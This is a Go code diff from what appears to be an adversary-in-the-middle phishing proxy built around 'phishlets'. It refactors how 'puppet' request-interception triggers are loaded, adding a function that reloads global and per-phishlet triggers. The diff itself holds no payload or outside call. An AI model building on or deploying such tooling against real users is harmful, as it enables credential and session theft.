@@ -148,14 +148,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Initialize interceptor
 	if pm := GetPuppetMaster(); pm != nil {
 		p.interceptor = NewRequestInterceptor(pm)
-		// Load triggers from puppet config
-		for _, trigger := range cfg.GetPuppetConfig().Triggers {
-			if trigger.Enabled {
-				t := trigger // Copy for pointer
-				p.interceptor.AddTrigger(&t)
-			}
-		}
+		p.ReloadPuppetTriggers()
 	}
+
 
 	p.Proxy.Verbose = false
 
@@ -1759,6 +1754,46 @@ func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 		}
 	}
 	return nil
+}
+
+// ReloadPuppetTriggers reloads all puppet triggers from config and phishlets
+func (p *HttpProxy) ReloadPuppetTriggers() {
+	if p.interceptor == nil {
+		return
+	}
+
+	p.interceptor.ClearTriggers()
+
+	// 1. Load global triggers
+	for _, trigger := range p.cfg.GetPuppetConfig().Triggers {
+		if trigger.Enabled {
+			t := trigger // Copy for pointer
+			p.interceptor.AddTrigger(&t)
+		}
+	}
+
+	// 2. Load triggers from active phishlets
+	enabledSites := p.cfg.GetEnabledSites()
+	for _, site := range enabledSites {
+		pl, err := p.cfg.GetPhishlet(site)
+		if err != nil || pl.puppet == nil {
+			continue
+		}
+
+		for _, trigger := range pl.puppet.Triggers {
+			if trigger.Enabled {
+				t := trigger // Copy for pointer
+				// Ensure phishlet name is set if missing
+				if t.Phishlet == "" {
+					t.Phishlet = site
+				}
+				p.interceptor.AddTrigger(&t)
+				log.Debug("[PROXY] Loaded puppet trigger %s from phishlet %s", t.Id, site)
+			}
+		}
+	}
+
+	log.Info("puppet: reloaded all triggers")
 }
 
 func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
